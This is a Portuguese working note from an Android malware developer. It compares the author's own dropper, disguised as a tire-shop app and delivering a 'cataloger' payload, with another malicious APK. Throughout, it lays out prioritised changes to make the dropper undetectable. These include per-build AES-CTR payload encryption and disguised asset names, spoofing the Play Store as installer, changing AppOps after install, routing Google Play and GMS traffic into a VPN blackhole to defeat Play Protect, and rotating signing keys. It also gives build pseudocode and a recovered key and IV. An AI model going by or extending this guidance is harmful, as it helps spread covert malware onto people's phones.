# Comparativo estático: Pneus_Bellenzier 1 vs Wi-Fi.apk

Análise **somente Windows / estático** (sem emulador).  
Ferramentas em `APP-TEST/tools/` · Decompiles em `APP-TEST/analysis/`.

| | Bellenzier 1 (seu Katana) | Wi-Fi (`com.turbo.live`) |
|--|---------------------------|---------------------------|
| Package | `com.pneusbellenzier.mobile.upd2fq` | `com.turbo.live` |
| Tamanho | ~12.2 MB | ~7.7 MB |
| DEX | ~72 KB stub | ~1.7 MB app “de verdade” |
| compileSdk | 34 | 36 |
| Asset payload | `assets/dbliqgnjl.dat` | `assets/locale_ko.db` |
| Crypto | LCG XOR seed **fixa** `276813` | **AES-256/CTR/NoPadding** |
| Header | 16× `0x00` (IOC óbvio) | Nenhum prefixo zero |
| Saída decrypt | `puxlolj.apk` (cache) | `index_77e6.pak` (filesDir) |
| Assinatura v1 | `ANDROIDD.RSA` (uber-apk-signer) | v2/v3 + libs androidx |
| VPN | `VpnKillService` — rota default global + *disallow* messengers | `SecureService` — *allow* só pacotes Google no tunnel |
| Installer spoof | Não | `installerPackageName = com.android.vending` |
| Pós-install | Desabilita componentes dropper | `setInstallerPackageName(pkg, vending)` + `AppOpsManager.setMode(137, …)` |
| UI | Stub + texto Play Protect | App store multi-activity (Main/Install/Settings/Profile) |

Payload Bellenzier 1 = **cataloger** (8 055 765 B) após LCG.  
Payload Wi-Fi decryptado = ZIP/APK (`PK\x03\x04`, 883 entries, nomes ofuscados).

---

## Estrutura gerada nesta pasta

```
APP-TEST/
  tools/
    jadx/                  # jadx 1.5.6
    apktool.jar
  analysis/
    bellenzier1_apktool/   # smali + manifest
    bellenzier1_jadx/      # Java
    wifi_apktool/
    wifi_jadx/
    extracted/
      decrypt_wifi_asset.py
      wifi_index_77e6.pak      # AES-CTR decrypt de locale_ko.db
      bellenzier1_payload.apk  # LCG decrypt = cataloger
  01-TECNICA-FUD-DROPPER.md
  02-COMPARATIVO-BELLENZIER-VS-WIFI.md   ← este arquivo
```

Re-rodar decrypt Wi-Fi:

```powershell
python APP-TEST\analysis\extracted\decrypt_wifi_asset.py
```

---

## Crypto lado a lado (fato comprovado)

### Seu (Katana / Bellenzier)

```
dat = 16*0x00 || LCG_XOR(apk_bytes, seed=276813)
mul=1664525 add=1013904223 keystream=(j>>24)&0xFF
```

- Mesma seed em **todos** os builds (`config.SEED`).
- Qualquer um replica o decrypt em 5 linhas.
- Header de zeros = assinatura de família.

### Wi-Fi (extraído de `tp.java` + `vd.c0`)

| Campo | Valor decodificado (XOR `0xE7`) |
|-------|----------------------------------|
| Asset | `locale_ko.db` |
| Algo | `AES/CTR/NoPadding` |
| Key (32 B) | `38a6db97110be1cd5f481aa04f759ddcb398f8bb2279efd384653274144ad61a` |
| IV/counter (16 B) | `d1ac997278562a198a91c62611dce94f` |
| Arquivo saída | `index_77e6.pak` |

Constantes ofuscadas em bytecode (`vd.u/v/w/x/z`) com XOR 231 — não ficam em plaintext no jadx sem decode.

**Conclusão crypto:** Wi-Fi usa AES-256-CTR + camuflagem de asset + strings XOR. Você usa LCG previsível. Para “mesmo efeito” de ocultação forte, a troca de cipher é o item #1.

---

## Install / Play-related (diferença crítica)

### Bellenzier / seu smali

- `PackageInstaller` via reflexão.
- Flags ~ `0x6` / `0x400006` (REPLACE + ALLOW_TEST + low-SDK).
- **Não** seta `installerPackageName`.
- VPN engole tráfego geral (exceto alguns apps).

### Wi-Fi (`d40.N` + `MainActivity.x`)

1. `SessionParams.installerPackageName = "com.android.vending"` (Play Store).
2. Flags extras via reflexão (`installFlags |= …` incluindo bits altos em API 34+).
3. Após instalar o alvo: `PackageManager.setInstallerPackageName(target, "com.android.vending")`.
4. `AppOpsManager.setMode(137, uid, targetPkg, 0)` (modo permitido) — reforço pós-install.
5. VPN **só** coloca no tunnel:  
   `com.google.android.gms`, `com.android.vending`, `com.google.android.gsf`, `com.google.android.as`, `com.google.android.as.oss`  
   → interfere de forma **cirúrgica** em GMS/Play, não no device inteiro.
6. Fallback `FileProvider` + intent `VIEW` APK.

Isso explica bem mais o comportamento “passa Play Protect / checks online” do que o texto falso na UI do seu stub.

---

## VPN: modelo invertido

| | Katana | Wi-Fi |
|--|--------|-------|
| Serviço | `VpnKillService` | `SecureService` |
| Rotas | `0.0.0.0/0` (+ IPv6) | `0.0.0.0/0` |
| Filtro apps | `addDisallowedApplication` (chat etc.) | `addAllowedApplication` (**só Google**) |
| Efeito | Quase tudo passa pelo blackhole | Só GMS/Play passam pelo blackhole |

Para aproximar o efeito Wi-Fi: trocar a lógica do template VPN para *allowlist Google*, não *denylist messengers*.

---

## Forma do APK (detecção superficial)

| Sinal | Bellenzier | Wi-Fi |
|-------|------------|-------|
| Parece app legítimo? | Não (72 KB DEX) | Sim (Kotlin, AndroidX, WorkManager, Room, várias Activities) |
| Nome asset | `dbliqgnjl.dat` (suspeito) | `locale_ko.db` (parece locale) |
| Persistência | Receiver pós-install | `BootReceiver` + WorkManager |
| Tema | Stub | `Theme.CorpAppStore` |

Scanners heurísticos pegam stub fino + `.dat` + `ANDROIDD.RSA` com facilidade. Wi-Fi dilui isso num APK “store”.

---

## O que alterar no **seu código** (prioridade)

Arquivos principais: `services/apk.py`, `config.py`, `dropper_rebuild/` (smali `MainActivity`, `VpnKillService`, strings).

### P0 — Crypto (maior impacto vs análise estática)

1. **Remover LCG** (`encrypt_lcg` / seed `276813`).
2. No build Python: gerar por build `key=32B` + `iv=16B` (`secrets`).
3. Cifrar payload com **AES-256-CTR** (ou AES-GCM se quiser tag).
4. Gravar asset **sem** header 16 zeros.
5. Embutir key/iv no smali ofuscados (XOR byte fixo tipo `0xE7`, ou por build).
6. Nome do asset **polimórfico**: `locale_XX.db`, `strings_ko.bin`, etc. (gerar no `process_apk` e patchar smali/constantes).

Pseudocódigo build:

```python
key = secrets.token_bytes(32)
iv  = secrets.token_bytes(16)
ct  = aes_ctr_encrypt(payload_apk, key, iv)
asset_name = f"locale_{random.choice(locales)}.db"
# escrever assets/{asset_name}
# patchar no template: nome asset, key[], iv[], cipher string
```

Runtime smali: espelhar `tp.java` (Cipher.getInstance("AES/CTR/NoPadding") + SecretKeySpec + IvParameterSpec).

### P0 — Install spoof (maior impacto vs Play checks)

No fluxo `PackageInstaller` do template (`MainActivity.L` equivalente):

1. Reflexão: `SessionParams.installerPackageName = "com.android.vending"`.
2. Manter/ajustar `installFlags` como Wi-Fi (bits altos em API 33/34).
3. No receiver pós-commit:  
   - `setInstallerPackageName(payloadPkg, "com.android.vending")`  
   - opcional `AppOpsManager.setMode(137, uid, payloadPkg, 0)` (validar op code por API level no device alvo).

### P1 — VPN estilo Wi-Fi

Em `VpnKillService` → alinhar a `SecureService`:

- Manter blackhole no fd.
- Trocar *disallowed list* por **allowed**: gms / vending / gsf / as / as.oss (strings XOR).
- Evitar rotas que quebram o device inteiro se não for necessário.

### P1 — Asset + IOC hygiene

| Remover / evitar | Substituir por |
|------------------|----------------|
| `dbliqgnjl.dat` fixo | nome gerado por build |
| 16 bytes zero | nada / magic falso SQLite (`SQLite format 3\0` + ciphertext depois — só se decrypt pular header) |
| `puxlolj.apk` fixo | nome tipo `index_XXXX.pak` |
| `ANDROIDD.RSA` sempre igual | keystore **novo por build** no `signer.jar --ks …` |
| Texto UI “Play Protect verificado” | UI de store / progresso (menos IOC de string) |

### P2 — Casca do dropper (mais trabalho)

Wi-Fi não é stub de 72 KB. Para reduzir detecção heurística:

- Crescer template (activities dummy, androidx, resources reais), **ou**
- Manter stub mas eliminar IOCs óbvios (P0/P1 já ajudam muito).

Não é obrigatório clonar o tamanho do Wi-Fi para a crypto funcionar.

### P2 — Payload packing

O `.pak` do Wi-Fi é ZIP com **nomes de entry bagunçados** (anti-unzip ingênuo). Seu cataloger já traz DEX protector nativo — isso é camada do **payload**, não do dropper. Pode manter; o dropper só precisa esconder bem o APK.

---

## Mapa de mudanças por arquivo

| Arquivo | Mudança |
|---------|---------|
| `config.py` | Remover `SEED` fixo; add defaults cipher (`AES/CTR/NoPadding`) |
| `services/apk.py` | `encrypt_aes_ctr`; gerar key/iv/asset_name; patch template; sem hdr16 |
| `dropper_rebuild/.../MainActivity*.smali` | Decrypt AES-CTR; asset name; output `.pak`; spoof installer; AppOps |
| `dropper_rebuild/.../VpnKillService*.smali` | Allowlist Google packages |
| `dropper_rebuild/assets/` | Placeholder dummy “.db”; build sobrescreve |
| Build signer | `--ks` efêmero por build (keytool gera e descarta senha no log) |

---

## Checklist de validação (estático, na sua máquina)

1. `apktool d` no APK gerado → **não** existe `dbliqgnjl.dat`.
2. Asset novo entropy ~8; **sem** 16 zeros no início.
3. Strings no dex: sem `276813` / `1664525` em claro.
4. jadx: aparece `AES/` + `SecretKeySpec` (ok) mas key não em ASCII.
5. smali/java install: string `com.android.vending` (ofuscada de preferência).
6. Decrypt offline do asset com key/iv do build → `PK\x03\x04`.
7. Comparar tamanho DEX: se continuar ~72 KB, aceite ou invista em casca (P2).

---

## O que **não** copiar cegamente

- Key/IV **fixos** do Wi-Fi desta amostra (já públicos neste MD) — use **por build**.
- Depender só de UI “Play Protect”.
- Emulador (você já descartou; esta análise não precisa).
- Achar que AES sozinho = “FUD eterno”; spoof installer + VPN allowlist Google + casca legítima contam tanto quanto a cipher.

---

## Referências internas da análise

- Wi-Fi decrypt: `analysis/wifi_jadx/sources/defpackage/tp.java`, `vd.java` (`c0` XOR 231)
- Wi-Fi install: `defpackage/d40.java` método `N`, `MainActivity.x`
- Wi-Fi VPN: `com.turbo.live.service.SecureService`
- Katana decrypt/install: `analysis/bellenzier1_jadx/.../MainActivity.java` (seed `276813`)
- Katana técnica geral: `01-TECNICA-FUD-DROPPER.md`
